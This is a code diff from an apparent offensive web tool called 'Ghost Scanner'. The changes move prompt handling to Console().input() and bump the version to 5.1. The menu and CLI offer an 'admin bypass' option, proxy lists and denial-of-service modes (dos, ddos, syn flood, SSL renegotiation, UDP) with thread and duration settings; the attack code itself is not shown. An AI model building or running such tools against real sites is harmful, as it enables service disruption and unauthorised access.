-                pdf=input("Generate PDF? [y/N]: ").strip().lower()=='y'
-                tools=input("Run external tools? [y/N]: ").strip().lower()=='y'
-                force_admin=input("Force admin bypass? [y/N]: ").strip().lower()=='y'
+                ai=Console().input("Enable AI? [y/N]: ").strip().lower()=='y'
+                pdf=Console().input("Generate PDF? [y/N]: ").strip().lower()=='y'
+                tools=Console().input("Run external tools? [y/N]: ").strip().lower()=='y'
+                force_admin=Console().input("Force admin bypass? [y/N]: ").strip().lower()=='y'
                 scanner=GhostScanner(target=target,ai=ai,pdf=pdf,use_tools=tools,force_admin=force_admin,scan=True)
                 try:scanner.run_scan(target)
                 except KeyboardInterrupt:Console().print("[red]Interrupted.[/red]")
                 except Exception as e:Console().print(f"[red]Error: {e}[/red]")
                 input("\n[Press Enter to continue]")
             elif choice=="2":
-                target=input("[bold cyan]Target URL: [/bold cyan]").strip()
+                target=Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                 if not target:continue
                 scanner=GhostScanner(target=target,use_tools=True)
                 try:scanner.run_scan(target)
                 except Exception as e:Console().print(f"[red]Error: {e}[/red]")
                 input("\n[Press Enter to continue]")
             elif choice=="3":
-                target=input("[bold cyan]Target URL: [/bold cyan]").strip()
+                target=Console().input("[bold cyan]Target URL: [/bold cyan]").strip()
                 if not target:continue
-                method=input("Method [dos/ddos/syn/ssl-reneg/udp]: ").strip().lower()
-                threads=int(input("Threads [200]: ").strip() or "200")
-                duration=int(input("Duration [30s]: ").strip() or "30")
+                method=Console().input("Method [dos/ddos/syn/ssl-reneg/udp]: ").strip().lower()
+                threads=int(Console().input("Threads [200]: ").strip() or "200")
+                duration=int(Console().input("Duration [30s]: ").strip() or "30")
                 m='http'
                 if method in ['dos']:m='http'
                 elif method in ['ddos']:m='all'
@@ -1553,8 +1613,7 @@ def main():
                 time.sleep(1)
         return
 
-    # CLI mode
-    p=argparse.ArgumentParser(description="Ghost Scanner v5.0",add_help=False)
+    p=argparse.ArgumentParser(description="Ghost Scanner v5.1",add_help=False)
     p.add_argument('-u','--url');p.add_argument('-o','--output',default='results.json')
     p.add_argument('-v','--verbose',action='store_true')
     p.add_argument('--proxy-list');p.add_argument('--validate-proxy',action='store_true')
@@ -1563,7 +1622,7 @@ def main():
     p.add_argument('--delay',type=float,default=0.5)
     p.add_argument('--force-admin',action='store_true')
     p.add_argument('--tools',action='store_true')
-    p.add_argument('--scan',action='store_true',help='Unified scan (gas semua)')
+    p.add_argument('--scan',action='store_true')
     p.add_argument('--dos',action='store_true');p.add_argument('--ddos',action='store_true')
     p.add_argument('--syn',action='store_true');p.add_argument('--ssl-reneg',action='store_true')
     p.add_argument('--udp',action='store_true')
@@ -1574,7 +1633,7 @@ def main():
 
     if not args.url:
         try:
-            args.url=input("[bold cyan]Enter target URL: [/bold cyan]").strip()
+            args.url=Console().input("[bold cyan]Enter target URL: [/bold cyan]").strip()
             if not args.url:
                 Console().print("[red]No target. Exiting.[/red]");sys.exit(1)
         except (KeyboardInterrupt,EOFError):
